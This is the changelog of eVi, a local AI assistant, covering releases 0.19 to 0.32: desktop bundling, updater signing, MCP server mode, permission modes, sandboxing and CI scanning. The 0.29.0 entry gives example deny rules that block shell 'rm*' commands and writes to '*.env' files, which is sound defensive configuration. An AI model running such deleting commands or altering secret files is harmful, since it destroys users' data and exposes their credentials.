  Routes & Recipes; live agent-watch (an SSE dispatch stream and busy
  indicator); a working-status indicator; a route indicator on the model chip;
  and a context-window breakdown (`/context` and a chip popover, Phase 88).
- **CLI and REPL** — configurable keybindings in `keybindings.toml` (Phase 82)
  with `evi keybindings list/path`, `evi command list/new`, `/recent`, and
  `evi://` deep links.
- **Self-build** — develop and build eVi with eVi (the self-build bootstrap).
- **Observability and data** — opt-in OpenTelemetry traces and metrics
  (Phase 89), and export of transcripts to a JSONL fine-tune dataset (Phase 90).
- **Voice** — pluggable TTS engines: system, Coqui, F5 and Piper (Phase 91).
- **Desktop** — an in-app update progress toast (Phase 79).
- **CI and supply chain** — the `evi-run` composite action for headless runs in
  GitHub Actions (Phase 84); gitleaks secret scanning and CodeQL (Phase 92); a
  GHCR container image built on version tags (Phase 93); keyless sigstore
  signing of the release artifacts (Phase 94).
- **Docs and tests** — a feature catalog (`docs/features.md`) with per-feature
  guides, skills and slash-command guides, sample configs with a validity test,
  an end-to-end suite that drives the real `evi` CLI, and an e2e sweep of every
  Settings screen with a CLI ↔ web ↔ desktop parity matrix.

### Fixed
- `reasoning_effort` is only sent to thinking-capable models.
- The model recommender compares GPU compute capability numerically.
- Ultracode matches small models on word boundaries, and its stage runner no
  longer crashes the pipeline.
- Chats persist and revive, so the desktop app no longer reopens to a blank
  chat.

## [0.31.0] — 2026-06-08

### Added — Claude Code parity, round 2 (phases 75–78)

From the [eVi vs Claude Code comparison](docs/claude-code-comparison.md):

- **Skills in plugins** (Phase 75) — plugins now bundle skills as well as
  commands (scanned as `<plugin>:<skill>`); `evi plugin list` shows both counts.
- **Nested project context** (Phase 76) — `EVI.md`/`AGENTS.md` are merged from
  every ancestor directory (root → cwd), so monorepos get layered context.
- **Trusted directories + domains** (Phase 77) — `auto.trusted_dirs` /
  `auto.trusted_domains` auto-approve file tools under a path or web fetches to a
  host, without opening a whole tool category (explicit deny rules still win).
- **MCP server allowlist** (Phase 78) — `[tools] mcp_allow` restricts which
  mcp.json servers load, so a shared/synced config can be gated per machine.

Desktop → 0.2.12.

## [0.30.0] — 2026-06-08

### Added

- **Customizable status line** (Phase 72) — `[statusline] enabled` prints a dim
  status line above each REPL prompt; customize via a `format` template
  ({model}/{pct}/{branch}/{goal}/…) or a `command` that gets the state as JSON
  on stdin. Off by default.
- **Routines / webhook triggers** (Phase 73) — `evi routine add <name>
  --recipe <r>` mints a token; `POST /api/routine/<token>` runs that recipe
  headless (auth = the path token; restricted tool perms unless `--yes`). Lets
  any external service trigger an eVi workflow over HTTP.
- **Project-level config** (Phase 74) — a repo-local `.evi.toml` (walked up from
  cwd) overlays the user config + active profile (project wins), so a repo can
  pin its own model/tools/permissions. Project context now also recognises
  **AGENTS.md** (EVI.md still wins).

Desktop → 0.2.11.

## [desktop 0.2.10] — 2026-06-08

### Fixed — "Command … not allowed by ACL" on desktop IPC

The desktop window loads the local server over `http://127.0.0.1:<port>`, which
Tauri treats as a *remote* URL — and a capability doesn't apply to remote pages
unless they're explicitly allowed. So every frontend `invoke()` (Check for
Updates, Open Logs, Get Support's external open) failed with
`Command <name> not allowed by ACL`. The default capability now allows
`http://localhost:*/*` + `http://127.0.0.1:*/*`. (Menus were unaffected — they
dispatch via Rust `eval`, not `invoke`.) Desktop → 0.2.10; no Python change.

## [0.29.0] — 2026-06-08

### Added — Claude Code parity (phases 64–71)

- **File checkpointing + rewind** — every `write_file` is journalled with the
  file's prior state; `evi rewind` / `/rewind` / File→Undo File Change restore
  modified files and delete newly-created ones.
- **Headless mode** — `evi run "<prompt>" [--format json] [--mode …] [--yes]`
  for scripts/CI/cron; prints text or a JSON envelope.
- **Permission modes + rules** — `auto.mode` (ask/accept_edits/plan/yolo) and a
  first-match allow/deny rule list (`deny shell rm*`, `deny write_file *.env`…),
  surfaced in Settings → Permissions.
- **Sandboxed code execution** — `run_python` can run under bwrap/sandbox-exec
  (read-only FS, no network) when `[tools] sandbox` is on.
- **Plugins** — `evi plugin add/list/remove` install command bundles from a
  local dir or git; the command loader scans them as `/<plugin>:<command>`.
- **Output styles** — switchable response personas (concise/explanatory/teacher
  or `~/.evi/styles/*.md`) via `[llm] output_style`, `evi style`, and Settings.
- **Multi-agent code review** — `evi review --multi` fans out parallel reviewers
  (correctness/security/performance/tests) and combines them.
- **Session continue/fork** — `evi sessions continue` (resume latest) and
  `evi sessions fork <id>` (diverge into a new session).

Desktop → 0.2.9.

## [0.28.0] — 2026-06-08

### Added

- **Session modes — Chat / Cowork / Code** — a segmented control in the header
  (like Claude Desktop) that gates which tools a session can use: Chat (memory +
  skills), Cowork (+ files, web, calendar, images, PDF), Code (+ code, shell,
  git, subagents). Switching hot-swaps the live agent's tools; the choice
  persists and follows tab switches. New `/api/modes` + `/api/session/{id}/mode`.

### CI

- **desktop-release** now warms the Tauri Windows bundler cache with retries
  before the release build, so transient `http status: 504` failures on the
  bundler's toolchain download self-heal (the Rust compile is cached, so the
  retries are cheap). Desktop 0.2.6/0.2.7 builds were lost to that outage; this
  release supersedes them.

Desktop → 0.2.8.

## [0.27.0] — 2026-06-08

### Added

- **Parallel multi-agent research** — `parallel_research(tasks)` runs up to 6
  read-only Explore subagents at once (one per sub-question) and combines their
  findings for the main model to synthesize.
- **Claude-Code-style custom slash commands** — `~/.evi/commands/*.md` gain
  frontmatter (`description`/`argument-hint`/`model`), `$ARGUMENTS` + positional
  `$1..$9`, `@file` inlining, and subdirectory namespacing (`/git:commit`). The
  legacy `{args}` still works. See [docs/commands.md](docs/commands.md).
- **System stats in Settings → Model & Backend** — OS, GPU, VRAM (total/free),
  RAM, driver + CUDA compute capability, and inference mode (new `/api/system`),
  plus the hardware-recommended model with a one-click Ollama **Pull** (progress
  bar) or **Use**.

### Fixed

- **File → Settings (and other native menu items) did nothing** in the desktop
  app — only the gear worked. The menu used `emit`, but withGlobalTauri's event
  module isn't reliably injected on the remote (localhost) page, so no listener
  was attached. The Rust bridge now `eval`s the JS handler directly.
- **Help → Check for Updates** now shows clear states: checking / up to date /
  downloading.

Desktop → 0.2.7 (0.2.6 was skipped — its build hit a sustained transient CDN
`504` on the Windows Tauri bundler; this release supersedes it).

## [0.26.0] — 2026-06-07

### Added — sync, recipes, memory tags, tool progress

Four roadmap phases (57–60).

- **Cross-machine sync** (`evi sync init/push/pull/status`) — git-backed sync of
  the portable `~/.evi` state (memory, skills, profiles, commands, routes,
  mcp.json, hooks). A managed `.gitignore` keeps per-machine config, secrets
  (`tokens/`), and large/rebuildable data (`models/`, `indices/`) local. First
  pull on a new machine adopts the remote state.
- **Recipes** (`evi recipe new/list/show/run`) — saved multi-turn workflows in
  `~/.evi/recipes/*.toml`, run through one shared conversation so later steps
  build on earlier answers. `run --yes` for unattended runs.
- **Memory tags** — `remember(..., tags="a, b")` + `recall_by_tag`; tags stored
  as an invisible marker, fully backward-compatible with untagged memories.
- **Tool progress heartbeats** — slow tools (web fetch/search, index build) now
  stream `ToolProgress` status to the CLI + web instead of an apparent hang;
  tools flagged `long` announce immediately.

Desktop → 0.2.6.

## [0.25.0] — 2026-06-07

### Added — settings screen, native menus, system tray, in-app docs

A Claude-Desktop-style control surface across the web + desktop frontends.

- **Settings screen** (⚙ / Ctrl+, / File → Settings): General, Model & Backend,
  Tools, Permissions, Context, Integrations, Server, About. Backed by a new
  `GET/POST /api/config` — full snapshot with secrets masked, plus a
  section-patch that hot-reloads live sessions and rebuilds the LLM client on
  backend/model changes.
- **Native menus** (desktop): File / Edit / View / Help with accelerators. Edit
  uses native undo/redo/cut/copy/paste/select-all; View has reload, zoom, theme
  toggle, and **Toggle Developer Tools**.
- **System tray + minimize-to-tray**: closing the window keeps eVi (and its warm
  sidecar) running in the tray — quit via the tray or File → Exit.
- **Force-update**: Help → Check for Updates triggers the signed updater on
  demand (the launch-time auto-check still runs).
- **In-app documentation** (Help → Documentation): renders `docs/*.md` offline
  via a new dependency-free Markdown renderer (`evi/apps/web/mdlite.py`) — no CDN
  needed; docs are bundled into the frozen sidecar.
- **Diagnostics** (Help → Run Diagnostics): `evi doctor` checks in-app, via
  `/api/doctor`.
- **Light theme** + a system/dark/light toggle.

### Testing

New Playwright e2e tests cover the settings screen, the `/api/config`
round-trip, in-app docs, and diagnostics. Desktop → 0.2.5.

## [0.24.3] — 2026-06-07

### Changed — rebranded to **eVi**

The product is now stylized **eVi** (lowercase-e, capital-V, lowercase-i)
everywhere it's shown: the app/installer name (`productName`), window title,
web/PWA title + header, CLI help/output, and the docs. The lowercase `evi`
import package, the `evi` CLI command, `EVI_*` env vars, the `evi-assistant`
PyPI name, and the `evi-assistant/evi-ai` repo are unchanged (code/identifier
surfaces).

> **Desktop note:** because the app's `productName` changed, the eVi installer
> installs to a new location (`…\eVi\`) — it does **not** upgrade an existing
> **Evi** install in place. Do a one-time clean switch: finish/skip the Evi
> update, uninstall **Evi**, then install **eVi** 0.2.4. From eVi onward,
> auto-update works in place again.

### Fixed — desktop updater failed with "Error opening file for writing"

The auto-updater's NSIS installer closed the main app but not the spawned
`evi-server` sidecar, which kept `_internal\*.dll` (e.g. `VCRUNTIME140.dll`)
locked → the install aborted. The updater now **kills the sidecar before
installing**, releasing the locks. Desktop → 0.2.4.

## [0.24.2] — 2026-06-07

### Fixed — chat showed no response (SSE frames split on the wrong separator)

Chat sent your message but never rendered a reply — no assistant bubble, no
error, Send just re-enabled. The frontend split the streamed SSE event frames
on `\n\n`, but `sse-starlette` (3.4.x, pulled into the fresh build) separates
them with `\r\n\r\n`. Since `\r\n\r\n` contains no `\n\n`, the parser found
**zero** frame boundaries and dispatched **zero** events. Both SSE readers (the
chat stream and session re-roll) now split on `/\r?\n\r?\n/` and tolerate CRLF
within frames. Affected all chat (web + desktop) in 0.23.0–0.24.1. Desktop →
0.2.3.

> Slipped through because there's no browser/e2e test of the chat stream — the
> Python tests assert the server *emits* events (parsed by code that handles
> both separators), never that the JS *renders* them.

## [0.24.1] — 2026-06-07

### Fixed — first-run wizard now actually activates the backend it sets up

A fresh Ollama user could finish the setup wizard, watch the "no backend"
banner clear, and still get **no reply** — because the wizard installed Ollama
and pulled a model but never pointed eVi's config at it, so chats kept hitting
the shipped default (LM Studio / a 7B that wasn't installed).

- **New `POST /api/backend/use`** persists `{backend, base_url, model}` to
  config and rebuilds live sessions' clients (works without a restart). When no
  model is given it picks one **actually installed** on the backend (preferring
  the hardware-recommended one), so the config never points at a missing model.
- **The wizard now activates the backend** after the pull: install → start →
  pull → **use** → ready.
- **Banner logic corrected:** it now keys off whether the **configured** backend
  (the one chat uses) is reachable — not "any backend is reachable," which was
  the bug that cleared the warning while chats hit a dead backend. When a
  *different* backend is running than the one configured, the banner offers a
  **"Use <backend>"** button. Message-send is gated on the configured backend.
- **Install feedback:** the silent Ollama install now shows a spinner.
- Desktop app → **0.2.2**.

## [0.24.0] — 2026-06-07

### Added — Phase 53: eVi as an MCP server (`mcp-server-publish`)

eVi has always been an MCP *client*; now it can run as an MCP *server* too, so
other agents (Claude Desktop, Cursor, Cline, Continue) can reach into eVi's
tools. This flips the integration story — instead of bridging into eVi from
each app, the app's existing MCP client connects to eVi.

- **`evi mcp serve`** — runs eVi as an MCP server over stdio, exposing a
  curated set of tools (default categories: `memory, index, calendar, git`;
  widen with `--categories`). Each MCP tool is a thin wrapper over the existing
  `evi.tools.base.REGISTRY` entry — same name, description, and JSON-schema, so
  there's one source of truth. Shell/computer/code-write are **not** exposed by
  default.
- **`evi mcp serve-config`** — prints a ready-to-paste `mcpServers` config
  snippet for Claude Desktop / Cursor.
- **`python -m evi`** now works (new `evi/__main__.py`) — the portable way an
  MCP client spawns the server.
- New `evi/mcp/publish.py` (`build_server`, `selected_tools`, `dispatch`).
  Verified end-to-end: a real MCP client initializes the server, lists tools,
  and calls one (input-schema validation enforced).

### Added — Phase 54: MCP server follow-ups (resources, prompts, HTTP, auth)

Builds on Phase 53's `evi mcp serve`:

- **Resources** — your long-term memory entries are exposed as MCP resources
  (`evi://memory/<name>`); clients can list + read them.
- **Prompts** — your saved slash-command templates (`~/.evi/commands/*.md`)
  are exposed as MCP prompts (with an optional `args` argument substituted into
  `{args}`).
- **Streamable HTTP transport** — `evi mcp serve --http [--host --port]` for
  remote clients (default stays stdio). `--token` gates it with a bearer token
  (constant-time compare); serving non-localhost without one warns.
- **Per-tool allow-list** — `--tools a,b,c` narrows the exposed set to exact
  tool names within the chosen `--categories`.
- Verified end-to-end: stdio lists tools/resources/prompts; HTTP rejects
  missing/bad tokens (401) and admits the right one.

### Added — Phase 55: opt-in OpenAI Responses API path

The agent loop can now talk the newer **Responses API** as an opt-in, without
disturbing local-first defaults.

- New **`[llm] api`** setting (`"chat"` default | `"responses"`), env override
  `EVI_LLM_API`. `"chat"` (Chat Completions) stays the default and the only
  shape eVi's local backends (LM Studio/Ollama/llama.cpp) support; `"responses"`
  is for endpoints that implement it (e.g. OpenAI cloud).
- New `evi/llm/responses.py`: chat↔responses request conversion (messages →
  `input` incl. tool-call/tool-result round-trips; tools flattened) and a stream
  **adapter** that re-emits Responses events as Chat-Completion-shaped chunks —
  so the large streaming/tool loop in `agent.py` is reused unchanged (one
  branch at the API call).
- **Not a migration:** with the default `"chat"`, nothing changes for existing
  users. The converters + adapter are unit-tested against the SDK's event
  shapes but NOT verified against a live Responses endpoint (no cloud in CI) —
  treat first real use as the integration test.

### Changed — PyPI distribution renamed to `evi-assistant`

The intended `evi-ai` name is taken on PyPI by an unrelated project, so the
distribution is now **`evi-assistant`** (`pip install evi-assistant`). The
import package and CLI are unchanged (`import evi`, run `evi`) — only the
install name, the in-app install hints, and the self-updater's target moved.
Publishing still requires PyPI Trusted Publishing configured for the new name.

## [0.23.0] — 2026-06-07

Phases 49–52 — supply-chain hygiene, a frictionless first run, desktop
auto-update, and opt-in crash reporting.

### Added — Phase 52: opt-in crash reporting

Privacy-first error reporting, **OFF by default and inert until configured**.

- **`evi/reporting.py`** — a swappable `Reporter` seam (`NullReporter` default;
  `SentryReporter` via the optional `sentry-sdk`) plus a shared **scrubber**
  applied to every event: rewrites home dir → `<HOME>` + username → `<USER>`,
  redacts API-key/token patterns, and **drops stack-frame locals, env,
  request/headers/cookies** — critical for an AI app where those can carry
  prompt text or keys. Anonymises `server_name`, drops the user/IP block.
- **`[telemetry]` config** (`crash_reports` off, `dsn`, `backend`) with env
  overrides `EVI_CRASH_REPORTS` / `EVI_TELEMETRY_DSN`. Point `dsn` at a
  self-hosted GlitchTip or hosted Sentry whenever you want — no code change.
- **Hooks:** a chained `sys.excepthook` (CLI) and `init_reporting()` at web
  `create_app()` (so sentry-sdk's FastAPI integration captures server errors —
  and the frozen desktop sidecar, which runs the same app). New optional extra
  `evi-assistant[telemetry]` (`sentry-sdk`).
- A "log a GitHub issue" backend was evaluated and deferred — it needs a
  token-holding relay and re-implements dedup/scrub/rate-limit that the SDK
  gives free; the `Reporter` seam leaves room for it later.

### Added — Phase 50: one-click first-run setup

A brand-new user has no LLM backend, so the web/desktop UI showed a dead-end
"no backend" banner. That banner is now a **setup wizard**:

- **`evi/firstrun.py`** — per-OS, package-manager-first Ollama install planning
  (`winget` on Windows, Homebrew on macOS, the official `install.sh` on Linux),
  with a graceful manual-download fallback when no unattended path exists, plus
  an `install_ollama()` runner (with `dry_run`).
- **`recommend.first_run_model(hw)`** — picks a small, fast default to auto-pull
  (`qwen2.5:3b-instruct-q4_K_M`, ~1.9 GB), capped at 3B even on big GPUs so the
  *first* download is quick; `recommend()` still surfaces the bigger
  hardware-optimal model as an upgrade.
- **New endpoints:** `POST /api/backend/install` (unattended Ollama install) and
  SSE `GET /api/backend/pull` (streams model-pull progress). `GET
  /api/backend/status` now also reports `recommended_model` +
  `can_auto_install_ollama`.
- **Web UI wizard:** the banner's "⚡ Set up eVi automatically" button chains
  install → start → pull (with a live progress bar) → recheck, so a fresh user
  reaches first chat without manual backend setup. Manual fallbacks remain.
- **Decisions (from research):** we deliberately do **not** bundle a runtime
  (the multi-GB model download is the real cost; bundling balloons the installer
  5–10×), and **vLLM is excluded** for first-run (GPU/CUDA/Linux server-grade).

### Added — Phase 51: desktop in-app auto-update

The desktop app now updates itself from its signed GitHub releases (the CLI/pip
path already self-updates via `evi update`; this is the desktop analog).

- **Tauri updater plugin** wired into the Rust shell: on launch it checks
  `releases/latest/download/latest.json` and, if a newer **signed** build
  exists, downloads + installs + restarts. Background — never blocks launch.
  Opt out with `EVI_AUTO_UPDATE=0`; skipped in remote mode.
- **Signing:** updater minisign keypair generated; public key in
  `tauri.conf.json`, private key + password as repo secrets consumed by
  `desktop-release.yml` (`createUpdaterArtifacts: true` → `.sig` + `latest.json`
  attached to releases). Only bundles signed with our key install.
- Desktop app version bumped **0.1.0 → 0.2.0** (the updater compares this to
  the latest release). OS code-signing (Authenticode/Apple) is still separate +
  TODO — minisign signing ≠ SmartScreen/Gatekeeper trust. Key handling + the
  release flow are documented in `docs/releasing.md`.

### Added — Phase 49: dependency vulnerability scanning

- CI **`security.yml`**: `pip-audit` (OSV) for Python + `cargo-audit` (RustSec)
  for the desktop crate, weekly + on push/PR. cargo-audit gates on real
  vulnerabilities only (Tauri's transitive GTK3 tree trips "unmaintained"
  notices with no upgrade path — those stay warnings).
- **`.github/dependabot.yml`** for pip + cargo + github-actions (weekly,
  grouped, Conventional-Commit prefixes); **`deny.toml`** for local
  `cargo deny` / future license+ban gating.
- GitHub-native **Dependabot alerts + security updates** enabled. (CodeQL /
  secret-scanning aren't free on private repos → deferred.)

### Added — desktop-release CI

- **`.github/workflows/desktop-release.yml`** builds the standalone Tauri
  installers (Windows/macOS/Linux) on `desktop-v*` tags or manual dispatch and
  attaches them to a draft release. Verified end-to-end on all three OSes.

### Fixed

- **CI was red since the initial commit** — `ci.yml` ran `ruff check evi apps
  tests`, but the top-level `apps/` had moved under `evi/apps/`, so the lint
  step errored before tests ran. Now `evi tests scripts`. CI is green.

### License

- The project is now explicitly **MIT** (LICENSE present; was already drafted).

## [0.22.0] — 2026-06-06

Phase 48 — desktop standalone launch is now fast, and the web/desktop UI
tells you (and helps you fix it) when no local LLM backend is running.

### Desktop — standalone launch ~2.7 s (was ~16 s)

- **`--onedir` sidecar, not `--onefile`.** `scripts/build-sidecar.{ps1,sh}`
  now freeze the server as a folder (`evi-server[.exe]` + `_internal/`)
  instead of a single self-extracting exe. Onefile unpacked ~70 MB to a
  temp dir on every launch (~13–16 s cold start); onedir runs in place, so
  the app window appears in ~2–3 s.
- **`tauri.standalone.conf.json` ships the folder via `bundle.resources`**
  (was `externalBin`, which expects a single binary). `main.rs` resolves
  the sidecar from Tauri's `resource_dir()` (`<resources>/evi-server/`),
  with adjacent-exe fallbacks for dev/staged layouts.
- The non-blocking loading shim (`desktop/dist-shim/index.html`, "Starting
  eVi…" spinner polling `/api/health`) added in 0.21.2 still covers any
  residual startup time and now almost always flashes by.

### Added — "No local LLM backend" UX (web + desktop)

- **Banner in the web UI** (`evi/apps/web/static/index.html`): when no
  reachable OpenAI-compatible backend is found, a "⚠ No local LLM backend"
  banner offers **Start** (auto-start Ollama), **Install** (open the
  backend's download page), and **Recheck**, and gates message-send until a
  backend answers.
- **`GET /api/backend/status`** probes the configured backend plus known
  local candidates **concurrently**, caches the result for 3 s, validates
  the OpenAI `/v1/models` shape (so a random service on a port isn't
  mistaken for an LLM), and reports llama.cpp's resolved port. New
  **`POST /api/backend/start`** (Ollama auto-start) and
  **`POST /api/backend/open-download`** back the banner's actions.

### Added — `evi/portprobe.py` + llama.cpp port discovery

- New dependency-light **`evi.portprobe`** module: a raw-socket
  `port_open` check, `is_openai_server` (200 + JSON `data` list), and
  `discover_llamacpp_url` that scans `8080..8090` for a real server. Host
  is normalised `localhost`/`::1` → `127.0.0.1`.
- **`evi/backends/llamacpp.py`** auto-discovers a live llama.cpp across
  8080–8090 when the configured port isn't the one serving (cached;
  `discover_ports=True`).

### Fixed

- **`:8080` false positives** — backend detection counted *any* service
  answering on a known port as an LLM. It now requires an OpenAI-shaped
  `/v1/models` response.
- **Slow backend status (~13.8 s → ~1.5 s)** — concurrent probing + a 3 s
  cache replace the old serial, uncached checks.
- **Windows `localhost` IPv6 stall** — a connect to a closed `::1`
  loopback port is *dropped* (SYN filtered), not refused, so it blocked for
  the full timeout. Probes and connections now pin to `127.0.0.1`.
- **Time-bomb transcript test** — `tests/test_transcripts.py` used a fixed
  date that would eventually fail; made it relative.
- **`python-multipart` missing from the `web` extra** — the `/api/transcribe`
  and `/api/upload` endpoints use `Form`/`UploadFile`, which FastAPI requires
  `python-multipart` for *at route-registration time*, so `create_app()`
  raised and the server wouldn't start. It was only ever present transitively
  via the `mcp` extra, so `pip install evi-assistant[web]` (and the standalone
  sidecar) shipped a server that crashed on boot. Now a declared `web` dep.

### Build — standalone sidecar

- **Isolated build venv.** `build-sidecar.{ps1,sh}` now prefer a `.venv-build`
  if present. `--collect-submodules evi` pulls every `evi.tools.*` module, so
  building from a dev `.venv` that has the `stt`/`computer`/`rerank` extras
  installed dragged torch + faster-whisper + sounddevice + av into the
  "practical tier" sidecar (~75 MB → >1 GB). Build from a venv with only
  `web,pdf,index,build-desktop` for the lean ~128 MB onedir.
- Added `--hidden-import python_multipart` (FastAPI imports it lazily, so
  PyInstaller's static analysis misses it) and a `python_multipart` line to
  `evi-server --check`.
- **Verified end-to-end on Windows (2026-06-06):** rebuilt the onedir sidecar
  (127.9 MB, `--check` OK), built both installers (`eVi_0.1.0_x64_en-US.msi`
  59.5 MB, `eVi_0.1.0_x64-setup.exe` 46.0 MB), and confirmed the built
  `evi-desktop.exe` resolves + spawns the sidecar, which serves
  `/api/health` 200 and the no-backend banner.

### Tests

- New `tests/test_portprobe.py`; rewrote `tests/test_backend_status.py`;
  +5 cases in `tests/test_backends.py` for the llama.cpp port fallback.

## [0.21.2] — 2026-05-29

### Desktop — fixed: app launched the sidecar but no window appeared

Running the built app spawned `evi-server.exe` (with a stray console
window) but showed no eVi window. Two `main.rs`/config bugs:

- **Duplicate window label.** `tauri.conf.json` declared a window
  (auto-labeled `main`) *and* `main.rs` creates a `main` window at runtime
  (so it can set the URL to the local server port / `EVI_REMOTE_URL` /
  shim). The runtime `build()` collided on the label and errored, killing
  the app right after it spawned the sidecar. Fixed by emptying
  `app.windows` in the config — `main.rs` is the sole window creator.
- **Stray console window + no logs.** The console-subsystem sidecar popped
  a console window, and its output went to `Stdio::null` (no debug trail).
  New `configure_child()` routes the sidecar's stdout/stderr to
  `~/.evi/logs/desktop-server.log` and spawns it with `CREATE_NO_WINDOW`
  on Windows (applied to both the bundled-sidecar and dev-python spawns).

- **Connection-refused / startup race.** With the window finally showing,
  it loaded `http://127.0.0.1:<port>` but the onefile sidecar's cold start
  (unpack 70 MB + import the server) takes ~13–16 s and varies, so a
  synchronous 20 s health-wait sometimes lost the race → the webview hit
  the port before the server bound. Reworked startup: `main.rs` no longer
  blocks — it shows a loading page **immediately** and injects the chosen
  port (`window.__EVI_PORT__`); the shim (`dist-shim/index.html`) polls
  `/api/health` and redirects to the server once it's up. Robust to any
  cold-start time, with a "Starting eVi…" spinner and a log-path hint.

Verified headlessly: the app stays alive (no crash), the sidecar binds,
and the root eVi UI serves HTTP 200 — the shim redirects into it. No
console window.

## [0.21.1] — 2026-05-29

### Desktop — standalone build verified end-to-end (Windows)

The self-contained desktop app was built for real on Windows; the
build scripts are no longer "verified-by-construction" only.

- **Verified:** PyInstaller froze a 72.7 MB `evi-server.exe` sidecar
  (`--check` self-test passes; the frozen server boots + answers
  `/api/health`), and `tauri build --config tauri.standalone.conf.json`
  produced `eVi_0.1.0_x64_en-US.msi` (~79 MB) and `eVi_0.1.0_x64-setup.exe`
  (~78 MB) with the sidecar embedded.
- **Fixed `desktop/src-tauri/Cargo.toml`:** removed a `[lib]
  evi_desktop_lib` target with no `src/lib.rs` (create-tauri-app mobile
  template leftover) that broke `cargo` outright — it's a plain binary
  crate.
- **Fixed `desktop/src-tauri/tauri.conf.json`:** `bundle.icon` listed only
  a PNG; the Windows resource + installers need an `.ico`. Added a
  generated icon set (`icons/`, via `tauri icon`) and the standard
  32/128/128@2x/icns/ico `bundle.icon` list.
- **`scripts/sidecar_entry.py`** gained a `--check` mode that imports the
  bundled deps (app + `fitz`/`numpy` + uvicorn protocols) and reports —
  lets a frozen build self-verify without a chat flow.

The `evi-assistant` wheel is functionally unchanged (these live in `desktop/` +
`scripts/`, neither of which ships in the wheel). See
`docs/desktop-bundling.md` for the full, now-verified flow.

## [0.21.0] — 2026-05-29

### Changed — self-contained desktop bundle (practical tier)

- The desktop sidecar now freezes **web + pdf + index** (was core + web).
  A standalone eVi Desktop build covers chat, tools, image-gen, the web UI,
  PDF reading, and semantic search with no Python on the machine. STT
  (`faster-whisper`/PortAudio) and computer-use stay opt-in via a system
  Python — they'd bloat the binary and drag in fiddly native deps.
  `build-sidecar.{ps1,sh}` install `.[web,pdf,index]` and add
  `--collect-all pymupdf --collect-all numpy --hidden-import fitz`.
- **OCR tesseract resolution** — `evi/tools/ocr.py` now resolves the
  binary in order: `$EVI_TESSERACT_CMD` → `~/.evi/tools/bin/tesseract`
  (what `evi-tools install` drops) → PATH. The desktop shell sets
  `EVI_TESSERACT_CMD` (+ `TESSDATA_PREFIX`) when a `tesseract` binary is
  bundled next to the sidecar, so OCR works offline in the standalone app.
- New **`evi-assistant[build-desktop]`** extra (`pyinstaller`) — a build-time-only
  dependency for freezing the sidecar.
- `docs/desktop-bundling.md` updated for the practical tier + the optional
  Tesseract-bundling step. (The Tauri/PyInstaller build itself is still
  per-OS and unverified in CI.)

### Distribution note

The desktop app is **not** a pip extra — pip extras only install Python
deps, they can't build a native installer. It's a separate downloadable
artifact (native installers via GitHub Releases), built from `desktop/` in
this monorepo, embedding a frozen server. `pip install evi-assistant` remains the
path for CLI / web / server / library use.

### Bumped to 0.21.0.

## [0.20.0] — 2026-05-29

### Added — external-binary provisioner + standalone desktop scaffold

- **`scripts/evi_tools.py`** (+ `evi-tools.ps1` / `.sh` wrappers) — a
  bootstrap helper *outside* the package for the programs eVi shells out
  to. **Package-manager-first** (winget/choco/scoop → brew →
  apt/dnf/pacman/zypper), falling back to a direct download into
  `~/.evi/tools/bin/` only where a clean prebuilt exists (ffmpeg).
  Commands: `list`, `install <tesseract|ffmpeg|ollama>` (`--dry-run`,
  `--force`), `remove`, `path`. Pairs with `evi doctor`, which reports
  what's missing.
- **Standalone desktop bundle (scaffold, unverified build).** The Tauri
  shell (`desktop/src-tauri/src/main.rs`) now prefers a frozen
  `evi-server[.exe]` **sidecar** sitting next to the app binary, falling
  back to system Python only when absent. `scripts/sidecar_entry.py`
  (imports the FastAPI `app` object + runs uvicorn) is frozen by
  `scripts/build-sidecar.{ps1,sh}` via PyInstaller and staged for Tauri's
  `externalBin`. A separate `tauri.standalone.conf.json` overlay enables
  the sidecar so the default (no-Python-bundled) build still works.
  Full flow + caveats in **`docs/desktop-bundling.md`**. The Python pieces
  are tested; the Rust+PyInstaller+Tauri build itself must be run per-OS.

### Changed

- Bumped to 0.20.0.

## [0.19.0] — 2026-05-28

### Changed — packaging: single `evi` namespace (no top-level `apps`)

- The CLI + web frontends moved from a top-level `apps/` package into
  **`evi.apps.*`** (`evi/apps/cli`, `evi/apps/web`). This removes the
  generic `apps` top-level package from the wheel — it would have risked a
  PyPI namespace collision with any other project shipping `apps`. The
  wheel's `top_level.txt` is now just `evi`.
- The Tauri desktop project moved out of the Python tree to a top-level
  **`desktop/`** (it was never a Python package).
- Entry point is now `evi = evi.apps.cli.main:app`; `evi web` and the Tauri
  shell launch `uvicorn evi.apps.web.server:app`. The `evi` command and
  `import evi` are unchanged for users.

### Changed — packaging: distribution renamed to `evi-assistant`

- The PyPI distribution is now **`evi-assistant`** (the bare `evi` name is taken).
  The **import package stays `evi`** (`import evi`) and the **CLI command
  stays `evi`** — only the install name changes: `pip install evi-assistant`.
- All in-app install hints now read `pip install 'evi-assistant[<extra>]'`.
- The self-updater (`evi update`) targets `evi-assistant` on PyPI: the version
  probe hits `/pypi/evi-assistant/json`, `pip show evi-assistant` detects editable
  installs, and pipx/poetry/uv/pipenv hints all reference `evi-assistant`.
  A new `evi.update.DIST_NAME` constant centralises the name.
- Verified `python -m build` produces `evi_assistant-0.19.0-py3-none-any.whl`
  carrying the `evi`/`apps` packages, the `evi` console-script entry
  point, `py.typed`, and the web static assets.

### Added — Phase 37: medium-value SDK items

Knocks out the four M-sized rows from `docs/sdk-coverage.md`, leaving only
MCP-server-publish and the Responses API migration.

- **Prompt caching (`cache_prompt`)** — new `[llm] cache_prompt` (default
  off). When on, forwards `extra_body.cache_prompt=true`; llama.cpp's
  server reuses the KV cache for the stable system+memory+project prefix
  across turns. vLLM does the equivalent server-side. Other backends
  ignore the key.
- **Logprobs + confidence** — new `[llm] logprobs` + `top_logprobs`. When
  enabled, the backend's per-token log-probabilities are collected into a
  new `LogProbs` event (avg/min logprob, low-confidence token count). The
  CLI prints a `confidence: N% avg · M low-confidence token(s)` line; the
  web UI shows a per-bubble confidence badge. Requested on the first round
  only.
- **Audio input** — `evi/audio_input.py` builds OpenAI `input_audio`
  parts for omni models (`model_supports_audio`: Qwen2.5-Omni, MiniCPM-o,
  gpt-4o-audio). `Agent.chat(audio=[...])`, web `ChatRequest.audio`, and
  the CLI `/audioraw <path> [prompt]` slash. **Graceful degrade:** non-omni
  models transcribe the clip via local Whisper and fold the transcript
  into the text, so "talk about this clip" works on any model.
- **Guardrails** — `evi/guardrails.py` + `~/.evi/guardrails.toml`: a local,
  regex-first content filter (off by default). Rules have `action`
  (block | redact) and `applies_to` (input | output | both). Input block
  rules refuse the turn before any LLM call; redact rules rewrite the text;
  output rules clean the stored reply and flag it. New `Guardrail` event,
